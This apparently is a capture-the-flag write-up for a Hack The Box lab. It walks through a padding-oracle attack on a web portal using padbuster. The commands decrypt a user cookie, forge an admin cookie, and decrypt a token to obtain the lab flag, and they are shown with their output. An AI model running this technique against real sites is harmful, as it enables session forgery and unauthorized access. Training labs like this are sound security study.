We get to login to the portal and we can see 2 functions, one /admin(getting to a admin portal were we have no success via our cookie) and /token(redeem something via a token that we don't have right now). 
The site is HTTP which means all those attacks like **poodle, bleicher, hearthbleed** won't work. **TestSSL.sh** neither as it isn't using HTTPS scheme.

The solution of the problem is as follows:
1)Playing around with the **/admin** endpoint we can see that only cookie get's parsed to allow access to the endpoint. The only message we get it is in the body as **"Unauthorized User"** but if we try to tamper the cookie of **htb-stdnt** with a fake one we get another error **"Decryption failed".**
Here we have what we need, the **sampledata=cookie**, the URL, the error and so on. We need to use encoding=1 because is HEX lowercase and use body as the error is hidden into body and not response code or size.
```
──(root㉿kali)-[/home/millycash/Downloads/Tools]
└─# padbuster http://94.237.55.163:31423/admin "7c7b804965d8ec1fa8bb423caac3522a287c6655c79ba37f18386d8e13e9a6dd6cf440a8829a6c9f696c5edf8401bf1906cb906002facf4072c2f49ff1975fba" 16 --encoding 1 --cookies "user=7c7b804965d8ec1fa8bb423caac3522a287c6655c79ba37f18386d8e13e9a6dd6cf440a8829a6c9f696c5edf8401bf1906cb906002facf4072c2f49ff1975fba" -error "Decryption failed" -usebody
** Finished ***
[+] Decrypted value (ASCII): {"user": "htb-stdnt", "role": "user"}
[+] Decrypted value (HEX): 7B2275736572223A20226874622D7374646E74222C2022726F6C65223A202275736572227D0B0B0B0B0B0B0B0B0B0B0B
[+] Decrypted value (Base64): eyJ1c2VyIjogImh0Yi1zdGRudCIsICJyb2xlIjogInVzZXIifQsLCwsLCwsLCwsL
```

2)Now that we have decrypted the cookie structure we can send the exact same request from step 1 but this time with plain-text to encrypt our cookie and get the admin access:
```
┌──(root㉿kali)-[/home/millycash/Downloads/Tools]
└─# padbuster http://94.237.55.163:31423/admin "7c7b804965d8ec1fa8bb423caac3522a287c6655c79ba37f18386d8e13e9a6dd6cf440a8829a6c9f696c5edf8401bf1906cb906002facf4072c2f49ff1975fba" 16 --encoding 1 --cookies "user=7c7b804965d8ec1fa8bb423caac3522a287c6655c79ba37f18386d8e13e9a6dd6cf440a8829a6c9f696c5edf8401bf1906cb906002facf4072c2f49ff1975fba" -error "Decryption failed" -usebody -plaintext '{"user": "admin", "role": "admin"}'
** Finished ***
[+] Encrypted value is: e229d8a9e42697ab26f61c38e00db5ae5f1cd90fdb85f20f81a48623746e914d3d2bdd97415095b66b720e552e81fedd00000000000000000000000000000000
```

3)Using this cookie get us eventually access to /admin endpoint where we can find a token:
```
Hello Admin! Here is your token:
0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3
```

4)Using this token we can now target **/token** and by using same methodology get the last flag. But we need to remember to update the right error code, maybe change the block-size(this time only words with 8 bytes) and use the post flag as the token is sent via post request as **token=XXXX**. The sample data is the token obtained from step 3.
```
┌──(root㉿kali)-[/home/millycash/Downloads]
└─# padbuster http://94.237.62.195:40649/token "0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3" 8 -encoding 1 -error "Decryption Error. Invalid Token! " -post "token=0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3"
** Finished ***
[+] Decrypted value (ASCII): HTB{f0b8ed15026e95ce5b4dbcacab0dbc3d}

```